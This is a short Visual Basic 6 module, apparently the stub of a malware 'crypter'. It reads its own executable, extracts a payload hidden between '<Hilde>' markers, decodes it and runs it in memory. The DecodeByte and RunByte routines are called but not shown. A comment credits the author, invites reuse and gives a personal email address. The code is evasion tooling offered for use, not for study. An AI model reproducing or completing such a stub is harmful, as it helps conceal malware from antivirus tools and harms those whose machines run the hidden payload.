Attribute VB_Name = "Mmain"
Private Decompress() As Byte
Private Sub Main()
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
Dim Buffer As String
Buffer = Space(FileLen(App.Path & "\" & App.EXEName & ".exe"))
Get #1, , Buffer
Decompress = StrConv(Split(Split(Buffer, "<Hilde>")(1), "</Hilde>")(0), vbFromUnicode)
Close #1
Call DecodeByte(Decompress, UBound(Decompress) + 1)
RunByte Decompress()
End Sub
'This program is Coded by SqUeEzEr,
'If you use this code in your program, include my name!
'Also I'd like a little thank you;) scott_van_dinter@hotmail.com

